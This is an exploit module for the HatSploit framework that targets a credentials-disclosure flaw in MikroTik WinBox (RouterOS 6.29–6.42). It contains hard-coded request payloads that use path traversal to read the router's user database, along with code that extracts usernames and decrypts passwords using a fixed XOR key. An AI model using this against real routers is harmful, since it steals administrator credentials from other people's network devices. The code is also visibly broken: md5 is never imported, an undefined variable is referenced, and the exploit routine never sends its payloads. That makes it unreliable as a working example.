#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module
from hatsploit.utils.http import HTTPClient


class HatSploitModule(Module, HTTPClient):
    details = {
        'Name': "MikroTik WinBox Credentials Disclosure",
        'Module': "exploit/linux/mikrotik/winbox_credentials_disclosure",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer',
            'Alireza Mosajjal - vulnerability researcher',
            'Mostafa Yalpaniyan - vulnerability researcher'
        ],
        'Description': "MikroTik WinBox RouterOS from 6.29 till 6.42 credentials disclosure.",
        'Comments': [
            'MikroTik RouterOS from 6.29 till 6.42'
        ],
        'Platform': "linux",
        'Risk': "high"
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'RPORT': {
            'Description': "Remote port.",
            'Value': 8291,
            'Type': "port",
            'Required': True
        }
    }

    stage1 = (
        b"\x68\x01\x00\x66\x4d\x32\x05\x00\xff\x01\x06\x00\xff\x09\x05\x07"
        b"\x00\xff\x09\x07\x01\x00\x00\x21\x35\x2f\x2f\x2f\x2f\x2f\x2e\x2f"
        b"\x2e\x2e\x2f\x2f\x2f\x2f\x2f\x2f\x2e\x2f\x2e\x2e\x2f\x2f\x2f\x2f"
        b"\x2f\x2f\x2e\x2f\x2e\x2e\x2f\x66\x6c\x61\x73\x68\x2f\x72\x77\x2f"
        b"\x73\x74\x6f\x72\x65\x2f\x75\x73\x65\x72\x2e\x64\x61\x74\x02\x00"
        b"\xff\x88\x02\x00\x00\x00\x00\x00\x08\x00\x00\x00\x01\x00\xff\x88"
        b"\x02\x00\x02\x00\x00\x00\x02\x00\x00\x00"
    )

    stage2 = (
        b"\x3b\x01\x00\x39\x4d\x32\x05\x00\xff\x01\x06\x00\xff\x09\x06\x01"
        b"\x00\xfe\x09\x35\x02\x00\x00\x08\x00\x80\x00\x00\x07\x00\xff\x09"
        b"\x04\x02\x00\xff\x88\x02\x00\x00\x00\x00\x00\x08\x00\x00\x00\x01"
        b"\x00\xff\x88\x02\x00\x02\x00\x00\x00\x02\x00\x00\x00"
    )

    def extract_from_entry(self, entry):
        username = entry.split(b"\x01\x00\x00\x21")[1]
        password = entry.split(b"\x11\x00\x00\x21")[1]

        username_len = username[0]
        password_len = password[0]

        username = username[1:1 + username_len]
        password = password[1:1 + password_len]

        return username, password

    def decrypt_password(self, username, password):
        key = md5(username + b"283i4jfkai3389").digest()

        passwd = ""
        for i in range(0, len(password)):
            passwd += chr(password[i] ^ key[i % len(key)])

        return passwd.split("\x00")[0]

    def get_pair(self, data):
        users = []

        entries = data.split(b"M2")[1:]
        for entry in entries:
            try:
                username, password = self.extract_from_entry(entry)
            except Exception:
                continue

            password = self.decrypt_password(user, password)
            username = username.decode("ascii")

            users.append((username, password))

        return users

    def exploit(self, remote_host, remote_port):
        creds = list()

        try:
            pass

            if creds:
                self.print_table("Credentials", ('Username', 'Password'), *creds)
            else:
                self.print_warning("Target vulnerable, but no credentials found.")
        except Exception:
            self.print_warning("Target vulnerable, but no credentials found.")

    def run(self):
        remote_host, remote_port = self.parse_options(self.options)

        self.print_process(f"Exploiting {remote_host}...")
        self.exploit(remote_host, remote_port)
